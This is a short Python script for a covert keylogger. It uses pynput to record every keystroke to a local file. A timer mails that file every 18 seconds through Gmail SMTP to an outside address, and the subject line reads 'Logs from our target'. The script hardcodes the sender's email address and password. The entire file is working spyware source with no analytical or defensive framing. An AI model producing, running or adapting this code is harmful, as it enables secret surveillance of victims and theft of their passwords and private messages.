from pynput import keyboard
import logging
from email.message import EmailMessage
import ssl
import smtplib
import threading


logging.basicConfig(filename='logs.txt',level=logging.DEBUG)

class KeyLogger:

    def __init__(self) -> None:
        self.email_sender = "mal1234@gmail.com"
        self.email_password = "wvsdrezhajnrynim"
        self.email_receiver = "mail1334@wp.pl"
        self.subject = 'Logs from our target'
        

    def make_mail(self):
        with open('logs.txt') as f:
            lines = f.readlines()
        body = lines
        em = EmailMessage()
        em['From'] = self.email_sender
        em['To'] = self.email_sender
        em['Subject'] = self.subject
        em.set_content(str(body))
        context = ssl.create_default_context()
        return context, em

    def on_press(self,key):
        logging.debug(str(key))



    def send(self):
        context, em = self.make_mail()
        with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as smtp:
            smtp.login(self.email_sender, self.email_password)
            smtp.sendmail(self.email_sender, self.email_receiver, em.as_string())
        timer = threading.Timer(18, self.send)
        timer.start()


    def start(self):
        with keyboard.Listener(on_press=self.on_press,) as listeaner:
            self.send()
            listeaner.join()
        

keylogger = KeyLogger()
keylogger.start()

